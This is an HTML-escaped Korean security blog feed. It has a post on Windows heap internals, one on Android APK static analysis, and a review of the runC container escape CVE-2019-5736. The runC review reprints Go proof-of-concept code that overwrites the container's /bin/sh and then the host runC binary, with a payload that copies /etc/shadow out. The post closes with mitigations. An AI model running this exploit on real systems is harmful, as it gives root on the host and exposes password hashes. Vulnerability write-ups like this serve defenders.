  &lt;li&gt;HeapCreate : 힙을 생성합니다.&lt;/li&gt;
  &lt;li&gt;HeapDestroy : 힙을 삭제합니다.&lt;/li&gt;
  &lt;li&gt;HeapAlloc : 힙 블록을 할당합니다.&lt;/li&gt;
  &lt;li&gt;HeapFree : 할당된 힙 블록을 해제합니다.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;이 정도는 이미 알고 계실거라 생각합니다.&lt;/p&gt;

&lt;p&gt;그럼 조금만 더 상세하게 알아볼게요.&lt;/p&gt;

&lt;h5 id=&quot;process-heap&quot;&gt;Process Heap&lt;/h5&gt;

&lt;p&gt;Process가 시작되면 최소한 하나의 기본 Process Heap(또는 Default Heap)이 생성됩니다.&lt;/p&gt;

&lt;p&gt;이 Process Heap은 Process 시작 시에 생성되고(기본 크기는 1MB) Process가 종료될 때까지 없어지지 않는 특징이 있습니다.&lt;/p&gt;

&lt;p&gt;흔히 사용하는 malloc, new는 Process Heap에서 할당하는 것입니다.&lt;/p&gt;

&lt;p&gt;이 기본 Heap은 프로그램 내에서 명시적으로 사용될 수도 있고 윈도우 내부 함수에 의해 암묵적으로 사용될 수도 있는데 프로그램에서 GetProcessHeap을 이용해 기본 Process Heap을 구할 수 있습니다.&lt;/p&gt;

&lt;p&gt;요약을 해보자면, Process가 시작되면 기본 Heap이 생성된다는 것과 malloc, new를 이용해서 아래 그림처럼 Heap을 할당받아 사용한다는 것입니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0a_1.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;지금까지 기본 Heap에 대한 설명을 했는데요,&lt;/p&gt;

&lt;p&gt;지금부터는 위 그림처럼 하나만 할당받는 것이 아닌 다양한 크기의 Heap 공간을 반복적으로 할당/해제하는 경우를 한 번 생각해보겠습니다.&lt;/p&gt;

&lt;h5 id=&quot;heap-fragmentation&quot;&gt;Heap Fragmentation&lt;/h5&gt;

&lt;p&gt;사용자가 Heap 공간을 쓰기 위해 할당을 요청하면 사용가능한 “연속된” 공간이 할당됩니다.&lt;/p&gt;

&lt;p&gt;그런데 다양한 크기의 Heap 공간을 요청하고 해제한다고 생각해봅시다.&lt;/p&gt;

&lt;p&gt;분명 할당받은 순서대로 해제하지는 않겠죠?&lt;/p&gt;

&lt;p&gt;정해진 순서없이 다양한 크기의 Heap이 할당되고 해제된다면, 아래 그림처럼 특정 순간에는 원하는 크기의 Heap을 할당해줄 수 없는 순간이 올 겁니다.&lt;/p&gt;

&lt;p&gt;이를 Heap Fragmentation(힙 단편화)이라고 합니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0a_2.png&quot; alt=&quot;[그림 1-2]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;위 그림에서 보듯, 남은 메모리 용량의 총합은 할당을 원하는 객체의 크기보다 크지만 연속된 공간을 할당해 줄 수 없는 상황이 옵니다.&lt;/p&gt;

&lt;p&gt;윈도우는 이러한 단편화 문제를 해결하기 위해서 특별한 방식들을 사용하고 있습니다.&lt;/p&gt;

&lt;p&gt;이 방식들을 살펴보면서 Heap에 대한 이해를 더 높여보겠습니다.&lt;/p&gt;

&lt;h5 id=&quot;free-list&quot;&gt;Free List&lt;/h5&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0a_3.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
&lt;/figure&gt;
&lt;center&gt;http://www.slideshare.net/ffri/mr201312-history-and-current-state-of-heap-exploit-eng&lt;/center&gt;

&lt;p&gt;Free List란 말 그대로 해제된 Heap 메모리들을 담아두는 List입니다.&lt;/p&gt;

&lt;p&gt;어떤 메모리를 할당해서 사용하고 난 뒤, 해제를 하면 그 메모리는 Free List에 들어가게 됩니다.&lt;/p&gt;

&lt;p&gt;그리고 다음 메모리를 할당하려고 하면 Heap 공간을 바로 쓰게 해주는 것이 아니라 Free List를 먼저 살펴봅니다.&lt;/p&gt;

&lt;p&gt;Free List에 적합한 크기의 Heap 메모리가 있을 경우는 해당 메모리를 할당해줍니다.&lt;/p&gt;

&lt;p&gt;만약 적절한 크기의 메모리가 없다면 요청한 크기만큼의 Heap을 새로 할당해주는 방식입니다.&lt;/p&gt;

&lt;p&gt;예를 들어, 프로그램이 시작된 후 처음으로 0x20 크기의 Heap을 요청했다고 가정하겠습니다.&lt;/p&gt;

&lt;p&gt;해제된 메모리가 없으니 Free List는 비어있겠죠?&lt;/p&gt;

&lt;p&gt;그럼 Heap의 할당은 다음 그림처럼 이루어집니다.&lt;/p&gt;

&lt;p&gt;(실제로는 0x20 + Heap Header 크기만큼 할당이 이루어집니다.)&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0a_4.png&quot; alt=&quot;[그림 1-4]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;그런 다음 이 메모리를 해제하게 되면 이 메모리는 Free List에 들어가게 됩니다.&lt;/p&gt;

&lt;p&gt;이후 프로그램이 다시 0x30 크기의 Heap을 요청하면 Free List를 먼저 살펴봅니다.&lt;/p&gt;

&lt;p&gt;0x30을 할당할 수 있을 만한 크기가 없기 때문에 새로 0x30만큼의 메모리를 할당해줍니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0a_5.png&quot; alt=&quot;[그림 1-5]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;이번에는 0x10만큼의 메모리 할당 요청이 들어왔다고 가정하겠습니다.&lt;/p&gt;

&lt;p&gt;이번에도 Heap 관리자는 Free List를 먼저 살펴보겠지요?&lt;/p&gt;

&lt;p&gt;Heap 관리자는 Best-Fit 정책을 사용하고 있기 때문에 최대한 적합한 크기의 Heap을 할당하려고 합니다.&lt;/p&gt;

&lt;p&gt;지금 상황에서는 0x30이 제일 적합한 메모리가 되겠네요.&lt;/p&gt;

&lt;p&gt;이 0x30 메모리를 모두 할당하는 것이 아니라 메모리를 분할하여 0x10만큼만 할당을 해줍니다.&lt;/p&gt;

&lt;p&gt;그런데 이런 방식을 사용하는 환경에서 작은 메모리 요청/해제가 빈번하게 일어나면 어떻게 될까요?&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0a_2.png&quot; alt=&quot;[그림 1-2]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;작은 메모리 조각이 계속해서 발생할 것이고 이를 관리하는 것에 한계가 생길 겁니다.&lt;/p&gt;

&lt;p&gt;이런 현상을 개선하기 위해서 최신 윈도우에서는 Low Fragmentation Heap이라는 정책을 도입했습니다.&lt;/p&gt;

&lt;h5 id=&quot;low-fragmentation-heap&quot;&gt;Low Fragmentation Heap&lt;/h5&gt;

&lt;p&gt;Low Fragmentation Heap(저단편화 힙)은 말 그대로 위에서 살펴본 Free List 방식에서 발생하는 단편화 현상을 줄이기 위해 도입되었습니다.&lt;/p&gt;

&lt;p&gt;Free List에서는 Heap을 계속해서 분할하는 방식이기 때문에 단편화 문제가 있다고 했었죠?&lt;/p&gt;

&lt;p&gt;그래서 Low Fragmentation Heap은 Bucket이라는 미리 정의된 서로 다른 크기의 범위를 갖는 블록을 관리함으로써 단편화를 해결합니다.&lt;/p&gt;

&lt;p&gt;쉽게 이야기해서, 미리 여러 크기로 Heap 공간을 분할해놓고 할당 요청이 오면 해당 크기를 포함하는 가장 작은 Bucket을 선택해 할당합니다.&lt;/p&gt;

&lt;p&gt;Bucket은 총 128개인데 첫 번째 Bucket은 1~8바이트, 두 번째는 9~16바이트 식으로 8바이트 단위로 구분되며, 마지막 Bucket은 15873~16384 바이트 크기까지 지원할 수 있습니다.&lt;/p&gt;

&lt;p&gt;만약 요청된 크기가 16384 바이트보다 크다면 Backend로 요청을 보냅니다.&lt;/p&gt;

&lt;p&gt;Backend로 요청이 이루어지면 Free List 방식으로 Heap 할당을 진행합니다.&lt;/p&gt;

&lt;p&gt;즉, Low Fragmentation Heap 기법은 미리 Bucket으로 나누어서 적합한 메모리를 찾는 속도를 증가시키고, 크기별 Free List들을 Lookaside List에 나누어 관리하는 것이죠.&lt;/p&gt;

&lt;p&gt;지금까지 Windows Heap 대해 알아봤습니다.&lt;/p&gt;

&lt;p&gt;다음 시간부터는 Heap에 대한 공격 기법을 살펴보도록 하겠습니다.&lt;/p&gt;</content><author><name>Joel Park</name></author><category term="Posts" /><summary type="html">0x0a Windows-Heap</summary></entry><entry><title type="html">android-0x01</title><link href="/android-0x01" rel="alternate" type="text/html" title="android-0x01" /><published>2019-03-29T14:00:00+09:00</published><updated>2019-03-29T14:00:00+09:00</updated><id>/android-0x01</id><content type="html" xml:base="/android-0x01">&lt;h1 id=&quot;android-정적-분석&quot;&gt;Android 정적 분석&lt;/h1&gt;

&lt;p&gt;안녕하세요 chaem 입니다.&lt;/p&gt;

&lt;p&gt;지난 포스팅에 이어서 이번에는 Android 정적 분석에 대해 포스팅 하려고 합니다.&lt;/p&gt;

&lt;p&gt;Android 정적 분석은 크게 2가지로 분류할 수 있습니다.&lt;/p&gt;

&lt;h4 id=&quot;-압축-해제-후-분석&quot;&gt;-압축 해제 후 분석&lt;/h4&gt;
&lt;p&gt;첫째로 Android 앱은 .apk 파일 확장자를 가지며, 압축된 형태이므로 압축을 해제한 후 해당 파일을 분석하는 방법입니다.&lt;/p&gt;

&lt;p&gt;아래 그림과 같이 apk 파일을 압축 해제하면 class.dex 파일이 생성되는 것을 확인할 수 있습니다.&lt;/p&gt;
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x01/01.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;이 class.dex 파일을 dex -&amp;gt; jar -&amp;gt; java 로 decompile 하면 소스코드를 확인 할 수 있습니다.&lt;/p&gt;

&lt;p&gt;우선 dex2jar를 이용하여 dex -&amp;gt; jar로 decompile 합니다.&lt;/p&gt;
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x01/02.png&quot; alt=&quot;[그림 1-2]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;jar 파일은 jd-gui를 이용해 decompile하여 소스코드를 확인할 수 있으며, 아래와 같이 난독화가 적용되어 있지 않으면 소스코드 분석을 통해 루팅 탐지 우회 등이 가능합니다.&lt;/p&gt;
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x01/03.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;아래와 같이 jadx-gui를 이용하면 apk 파일을 바로 java 소스 코드로 확인할 수 있는 방법도 있습니다.&lt;/p&gt;
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x01/04.png&quot; alt=&quot;[그림 1-4]&quot; /&gt;
&lt;/figure&gt;

&lt;h4 id=&quot;-decompile-후-분석&quot;&gt;-Decompile 후 분석&lt;/h4&gt;
&lt;p&gt;두번째는 apk파일을 decompile한 후 해당 파일을 분석하는 방법입니다.&lt;/p&gt;

&lt;p&gt;apktool을 이용하면 아래 그림과 같이 apk 파일이 decompile되는 것을 확인할 수 있습니다.
주요 분석 대상은 AndroidManifest 파일,  smali 코드, lib 폴더 등이 있습니다.&lt;/p&gt;
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x01/05.png&quot; alt=&quot;[그림 1-5]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;AndroidManifest.xml 파일은 해당 앱에 대한 권한 등의 필수적인 정보를 포함하고 있으며, 앱에서 불필요한 권한을 요청하고 있는지 확인해보아야 합니다.&lt;/p&gt;
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x01/06.png&quot; alt=&quot;[그림 1-6]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;smali 코드는 An assembler/disassembler for Android’s dex format의 약자로 코드 분석을 통해 실행 원리를 파악할 수 있습니다. 따라서 코드 수정 후 리패키징을 통해 앱 변조가 가능합니다.&lt;/p&gt;
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x01/07.png&quot; alt=&quot;[그림 1-7]&quot; /&gt;
&lt;/figure&gt;
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x01/08.png&quot; alt=&quot;[그림 1-8]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;lib 폴더 내에는 동적라이브러리인 *.so 파일을 포함하며, 보통 보안 솔루션들이 동적 라이브러리로 존재하고 있습니다. 아래 그림과 같이 IDA를 통해 분석이 가능하며, 보안 솔루션에서 루팅을 탐지하는 로직을 확인할 수 있습니다.&lt;/p&gt;
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x01/09.png&quot; alt=&quot;[그림 1-9]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;지금까지 Android 정적 분석에 대해 알아보았고, 다음 포스팅에서는 Android 동적 분석에 대해 알아보도록 하겠습니다.&lt;/p&gt;

&lt;p&gt;감사합니다.&lt;/p&gt;</content><author><name>Chaem</name></author><category term="Posts" /><summary type="html">Android 정적 분석</summary></entry><entry><title type="html">CVE-2019-5736 (runC Container 취약점)</title><link href="/runC-Container" rel="alternate" type="text/html" title="CVE-2019-5736 (runC Container 취약점)" /><published>2019-03-28T02:43:00+09:00</published><updated>2019-03-28T02:43:00+09:00</updated><id>/runC%20Container</id><content type="html" xml:base="/runC-Container">&lt;h2 id=&quot;cve-2019-5736-runc-container-취약점&quot;&gt;CVE-2019-5736 (runC Container 취약점)&lt;/h2&gt;

&lt;p&gt;안녕하세요. Sulla임돠!&lt;/p&gt;

&lt;p&gt;2월 11일 &lt;strong&gt;docker&lt;/strong&gt;관련 런타임인 &lt;strong&gt;runC&lt;/strong&gt; 관련 취약점 &lt;strong&gt;CVE-2019-5736&lt;/strong&gt; 공개 되었습니다. 
공개된지 1주일도 안지나 &lt;strong&gt;POC&lt;/strong&gt;가 공개되고 있으며, 영향력도 큰 취약점으로 많은 주목을 받고있습니다.&lt;/p&gt;

&lt;p&gt;그래서 이번 포스팅에서는 해당 취약점에 대하여 리뷰해 보겠습니다.&lt;/p&gt;

&lt;h2 id=&quot;본-포스팅에서는-환경-구축버전-등의-정보는-제외하겠습니다&quot;&gt;[&lt;strong&gt;본 포스팅에서는 환경 구축/버전 등의 정보는 제외하겠습니다.]&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;먼저 &lt;strong&gt;docker&lt;/strong&gt;가 뭔지…&lt;strong&gt;runC&lt;/strong&gt;가 뭔지에 대해서 알아야겠죠??언제나 그렇듯 최대한 간단하고 필요한 내용만 쉽게 알아보겠습니다.(&lt;strong&gt;귀차니즘&lt;/strong&gt; 아닙니다…..)&lt;/p&gt;

&lt;p&gt;우선 &lt;strong&gt;docker&lt;/strong&gt;란 &lt;strong&gt;Linux&lt;/strong&gt; 기반의 &lt;strong&gt;container runtime 오픈소스 플랫폼&lt;/strong&gt; 입니다. 쉽게 말해 &lt;strong&gt;Container 관리 플랫폼&lt;/strong&gt;이며, &lt;strong&gt;VM&lt;/strong&gt;(Virtual Machine)과 비슷한 역할을 수행하지만 쉬운 배포 및 높은 확장성 등의 &lt;strong&gt;접근성&lt;/strong&gt;과 메모리 점유등의 &lt;strong&gt;성능&lt;/strong&gt;의 차이를 보입니다.(“&lt;strong&gt;가상화&lt;/strong&gt;“가 목표이긴 합니다.)&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/jobs/runC_Container/5736-1.png&quot; alt=&quot;[그림 5736-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;Docker의 기본 구성을 위 그림과 같이 표현했습니다. 각각의 역할을 알아 보겠습니다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Docker Engine : 사용자와 상호작용을 합니다.&lt;/li&gt;
  &lt;li&gt;Containerd : 직/간접적으로 호스트에서 컨테이너 전체 라이프 사이클을 관리합니다. (이미저 전송 및 저장, 컨테이너 실행 및 관리(runC 사용), 네트워크 인터페이스 관리 등)&lt;/li&gt;
  &lt;li&gt;Containerd-shim : runC를 사용해 컨테이너를 시작된 후에 runC가 종료 되어도 컨테이너가 실행 되도록합니다.&lt;/li&gt;
  &lt;li&gt;runC : 컨테이너를 실행하는 런타임이며, CLI 툴 입니다. (리눅스 커널 네임스페이스, Cgroups(프로세스의 자원 사용을 제한하는 커널 기능), Seccomp(리눅스 커널에서 샌드 박싱 메커니즘을 제공하는 보안 기능), 리눅스 보안 모듈 등)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;기본 구성 및 역할에 대하여 알아봤고 &lt;strong&gt;CVE-2019-5736&lt;/strong&gt; 취약점에 직접적인 영향을 미치는 runC에 대해서 알아 보겠습니다.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;runC&lt;/strong&gt;는 &lt;strong&gt;container&lt;/strong&gt;의 &lt;strong&gt;생성/실행&lt;/strong&gt; 등을 위한 기본적인 기술이며 &lt;strong&gt;CLI&lt;/strong&gt; 도구입니다. 즉, &lt;strong&gt;container&lt;/strong&gt;의 &lt;strong&gt;조작&lt;/strong&gt;을 위해 존재 한다고 생각하면 될 것 같습니다. &lt;strong&gt;runC&lt;/strong&gt;는 Docker, containerd, Podman 및 CRI-O가있는 &lt;strong&gt;컨테이너의 기본 런타임&lt;/strong&gt;으로 사용됩니다.&lt;/p&gt;

&lt;p&gt;그럼 이번 포스팅의 주인공인 &lt;strong&gt;CVE-2019-5736&lt;/strong&gt;에 대해서 알아보겠습니다.&lt;/p&gt;

&lt;h1 id=&quot;cve-2019-5736&quot;&gt;CVE-2019-5736&lt;/h1&gt;

&lt;p&gt;해당 취약점은 위에서 알아본 &lt;strong&gt;runC&lt;/strong&gt;에서 발생하는 취약점입니다. &lt;strong&gt;**컨테이너 내부에서 **루트 권한&lt;/strong&gt;으로 악의적인 프로세스를 실행할 경우 &lt;strong&gt;runC 버그&lt;/strong&gt;를 이용하여 컨테이터를 실행하는 &lt;strong&gt;호스트에 대한 루트 권한&lt;/strong&gt;을 탈취하는 취약점입니다. 따라서, 서버에 대한 접근 및 해당 서버의 다른 컨테이너 또한 접근이 가능합니다.&lt;/p&gt;

&lt;p&gt;쉽게 말해 &lt;strong&gt;악성 컨테이너&lt;/strong&gt;를 통해 &lt;strong&gt;호스트 서버의 루트 권한 탈취&lt;/strong&gt;가 가능하게 됩니다.&lt;/p&gt;

&lt;p&gt;해당 취약점의 트리거 방법은 다음중 하나 입니다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;컨테이너 내부의 악성 프로세스 실행(루트로 실행되는 )&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;악성 docker 이미지를 실행&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;해당 취약점을 트리거 하기 위해서는 위에서도 언급했 듯 &lt;strong&gt;컨테이너 내부&lt;/strong&gt;에 &lt;strong&gt;루트 권한&lt;/strong&gt;이 있어야 합니다.&lt;/p&gt;

&lt;p&gt;화면 구성은 위쪽은 &lt;strong&gt;Host Server&lt;/strong&gt;, 아래쪽은 &lt;strong&gt;Container&lt;/strong&gt; 입니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/jobs/runC_Container/5736-2.png&quot; alt=&quot;[그림 5736-2]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;진행 자체는 굉장히 간단하게 진행됩니다.(물론 저는 삽질 했습니다……Aㅏ…..) 먼저 &lt;strong&gt;Host Server&lt;/strong&gt;쪽에 해당 파일이 없음을 확인 합니다. 후에는 컨테이너에서 악성 파일을 실행하면 준비가 끝납니다. 함정 처럼 &lt;strong&gt;/bin/sh&lt;/strong&gt;를 &lt;strong&gt;#!/proc/self/exe&lt;/strong&gt; 바꿔놓고 기다리는 단계입니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/jobs/runC_Container/5736-3.png&quot; alt=&quot;[그림 5736-3]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;그리고 호스트가 컨테이너쪽으로  &lt;strong&gt;docker exec&lt;/strong&gt; 명령을 통해 &lt;strong&gt;/bin/sh&lt;/strong&gt;의 실행을 명하게 되면 위에서 설치해뒀던 함정이 발동하게 됩니다. 함정 카드….. &lt;strong&gt;(/bin/sh를 쓸것이라 추측하고 세팅 하는겁니다.)&lt;/strong&gt; 
다음으로 &lt;strong&gt;runC&lt;/strong&gt;의 &lt;strong&gt;PID&lt;/strong&gt;를 찾고 &lt;strong&gt;핸들링(O_PATH ,O_WRONLY 플래그 사용)&lt;/strong&gt;을 위한 여러 과정을 거치고 최종적으로 호스트의 &lt;strong&gt;runC&lt;/strong&gt; 바이너리 파일을 &lt;strong&gt;악성 runC&lt;/strong&gt; 로 변조되며 악성 파일에 미리 정의 되있던 행위를 &lt;strong&gt;호스트&lt;/strong&gt;쪽에서 &lt;strong&gt;루트 권한&lt;/strong&gt;으로 수행하게 됩니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/jobs/runC_Container/5736-4.png&quot; alt=&quot;[그림 5736-4]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;처음에는 없던 shadow 파일이 root 권한으로 생성된 것을 확인할 수 있습니다. 해당파일을 열람시 실제 shadow 파일임을 확인 가능합니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/jobs/runC_Container/5736-5.png&quot; alt=&quot;[그림 5736-5]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;위 과정을 거치면서 &lt;strong&gt;Host Server&lt;/strong&gt;쪽의 runC 파일이 변조됩니다. 해쉬값을 비교하면 쉽게 확인 가능하며 위쪽 해쉬값이 원본이면 아래쪽은 변조된 runC 바이너리의 해쉬값입니다.&lt;/p&gt;

&lt;p&gt;두 번째 방법의 경우는 첫 번쨰와 원리는 같으며 차이점은 악성 docker 이미지를 생성해서 배포하고 피해자는 해당 이미지를 다운받아 실행하게 되면 위에서와 같은 일련의 동작들을 수행하게 됩니다.&lt;/p&gt;

&lt;p&gt;보신것처럼 &lt;strong&gt;Container&lt;/strong&gt; 쪽에서 &lt;strong&gt;Host Server&lt;/strong&gt;의 &lt;strong&gt;root&lt;/strong&gt; 권한으로 악의적인 행위가 가능한 취약점입니다.&lt;/p&gt;

&lt;p&gt;어쩌다 이런 일이 생기는지 코드를 보면서 확인 해보겠습니다. (해당 poc코드는 go로 작성 되었습니다.)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;var payload = &quot;#!/bin/bash \n cat /etc/shadow &amp;gt; /tmp/shadow &amp;amp;&amp;amp; chmod 777 /tmp/shadow&quot;

func main() {
	fd, err := os.Create(&quot;/bin/sh&quot;)
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Fprintln(fd, &quot;#!/proc/self/exe&quot;)
	err = fd.Close()
	if err != nil {
		fmt.Println(err)
		return
	}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;우선 &lt;strong&gt;Container&lt;/strong&gt;에서 악성 프로세스를 실행하게 되면 위 코드가 실행됩니다.&lt;/p&gt;

&lt;p&gt;1라인의 행위를 위해 아래의 코드들이 쭉 진행됩니다.&lt;/p&gt;

&lt;p&gt;코드의 4라인에서 /bin/sh 를 생성 하고 fd에 저장 합니다. 다음으로 9라인에서 #!/proc/self/exe를 fd에 저장 합니다. Fprintln()함수는 첫 번째 인자에 두 번째 인자를 전달하는 기능을 수행 합니다. 첫 번째 인자인 fd는 /bin/sh이며 여기에 /proc/self/exe가 저장 되겠죠.&lt;/p&gt;

&lt;p&gt;위 코드의 동작을 해석 하자면 9라인의 &lt;strong&gt;#!/proc/self/exe(&lt;/strong&gt;해당 프로세스를 위해 실행된 바이너리를 가리키는 모든 프로세스에 대한 &lt;strong&gt;커널&lt;/strong&gt;이 만든 &lt;strong&gt;심볼릭 링크&lt;/strong&gt;입니다.&lt;strong&gt;)&lt;/strong&gt;는 현재 실행된 프로세스를 어떤놈이 실행 시켰는지에 대해 가리킵니다. 현재 실행된 프로세스는 Host에 의해서 실행된 /bin/sh 이죠. 따라서 /bin/sh을 실행 시킨놈은 Host의 &lt;strong&gt;runC&lt;/strong&gt;입니다.
다시 정리 해본다면, Host에서 Container의 /bin/sh을 &lt;strong&gt;docker exec&lt;/strong&gt;를 통해 실행 하는데 이 때 &lt;strong&gt;runC&lt;/strong&gt;가 사용 됩니다. 결국 &lt;strong&gt;#!/proc/self/exe&lt;/strong&gt;가 가리키는 놈은 &lt;strong&gt;Host의 runC&lt;/strong&gt;가 되고 &lt;strong&gt;/bin/sh&lt;/strong&gt;는 결국 Host의 &lt;strong&gt;runC&lt;/strong&gt;가 됩니다.
여기가 &lt;strong&gt;CVE-2019-5736&lt;/strong&gt; 취약점의 주요 원인이라 판단이 됩니다. &lt;strong&gt;/proc/self/exe&lt;/strong&gt;가 가리키는 것에 대해서 &lt;strong&gt;부적절하게 처리함&lt;/strong&gt;으로서 위와 같은 행위가 가능해 지는것이죠.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;var found int
	for found == 0 {
		pids, err := ioutil.ReadDir(&quot;/proc&quot;)
		if err != nil {
			fmt.Println(err)
			return
		}
		for _, f := range pids {
			fbytes, _ := ioutil.ReadFile(&quot;/proc/&quot; + f.Name() + &quot;/cmdline&quot;)
			fstring := string(fbytes)
			if strings.Contains(fstring, &quot;runc&quot;) {
				fmt.Println(&quot;[+] Found the PID:&quot;, f.Name())
				found, err = strconv.Atoi(f.Name())
				if err != nil {
					fmt.Println(err)
					return
				}
			}
		}
	}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;다음 코드에서는 runC가 구동 되는 동안 runC를 덮어쓸 수 없기 때문에 이를 해결 하기위한 코드가 짜여져 있는데 이 때 필요한 &lt;strong&gt;runC의 PID를 찾기위한 코드&lt;/strong&gt;입니다. /proc/[PID]/cmdline(해당 PID를 갖는 프로세스가 어떤 command로 실행 되었는지를 나타냅니다.)에 있는 모든 파일에서 runC를 찾고 결과적으로 runC의 PID를 확보 합니다.
즉, 모든 PID를 대상으로 어떤 친구가 runC를 실행 했는지 찾아 내는 과정입니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;var handleFd = -1
	for handleFd == -1 {
		handle, _ := os.OpenFile(&quot;/proc/&quot;+strconv.Itoa(found)+&quot;/exe&quot;, os.O_RDONLY, 0777)
		if int(handle.Fd()) &amp;gt; 0 {
			handleFd = int(handle.Fd())
		}
	}
	fmt.Println(&quot;[+] Successfully got the file handle&quot;)

	for {
		writeHandle, _ := os.OpenFile(&quot;/proc/self/fd/&quot;+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700)
		if int(writeHandle.Fd()) &amp;gt; 0 {
			fmt.Println(&quot;[+] Successfully got write handle&quot;, writeHandle)
			writeHandle.Write([]byte(payload))
			return
		}
	}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;다음 코드에서는 위에서 찾아낸 runC의 PID값을 이용해 파일 핸들을 얻어냅니다. 이 핸들을 이용해 &lt;strong&gt;/proc/self/fd/파일 서술자&lt;/strong&gt;의 &lt;strong&gt;파일 핸들&lt;/strong&gt;을 얻습니다. 해당 파일 핸들을 유지하며 Host의 runC를 악성 runC로 바꾸는 등의 권한을 얻게 됩니다.&lt;/p&gt;

&lt;p&gt;위에서의 과정에서 보이듯 &lt;strong&gt;rudC&lt;/strong&gt;의 &lt;strong&gt;파일 서술자(/proc/self/exe)&lt;/strong&gt;에 대한 처리 미흡으로 권한 상승이 가능해지는 취약점입니다.&lt;/p&gt;

&lt;h1 id=&quot;대응-방법&quot;&gt;대응 방법&lt;/h1&gt;

&lt;p&gt;취약점의 동작 조건중 하나는 &lt;strong&gt;Container&lt;/strong&gt;에의 &lt;strong&gt;root&lt;/strong&gt;권한이 있어야 합니다. 또한 &lt;strong&gt;출처를 알 수 없는 이미지&lt;/strong&gt;를 무분별하게 사용시에도 공격 시나리오가 생길것입니다. 
전부는 아니지만 대부분의 Cloud Container system이 &lt;strong&gt;CVE-2019-5736&lt;/strong&gt; 취약할 것 입니다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Container root 권한 제한&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;신뢰할 수 없는 이미지 파일 사용 자제&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;runC 등 최신 버전 유지&lt;/strong&gt;&lt;/li&gt;
